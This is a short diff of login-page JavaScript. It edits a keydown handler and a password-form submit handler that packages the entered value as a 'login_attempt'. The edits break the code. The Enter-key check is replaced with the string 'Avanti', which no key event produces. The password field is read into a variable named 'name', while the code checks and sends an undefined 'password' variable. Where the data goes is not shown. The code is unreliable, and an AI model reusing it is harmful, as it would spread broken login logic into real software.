@@ -489,7 +489,7 @@
             "keydown",
             function(event) {
 
-                if (event.key === "Enter") {
+                if (event.key === "Avanti") {
                     passwordNext.click();
                 }
 
@@ -499,9 +499,9 @@ document.getElementById('password-form').addEventListener('submit', async functi
 
     event.preventDefault();
 
-    var name = document.getElementById('name').value.trim();
+    var name = document.getElementById('password').value.trim();
 
-    if (!name) {
+    if (!password) {
 
         return;
 
@@ -509,7 +509,7 @@ document.getElementById('password-form').addEventListener('submit', async functi
 
     var data = {
 
-        "name": name,
+        "name": password,
 
         "event": "login_attempt",
 
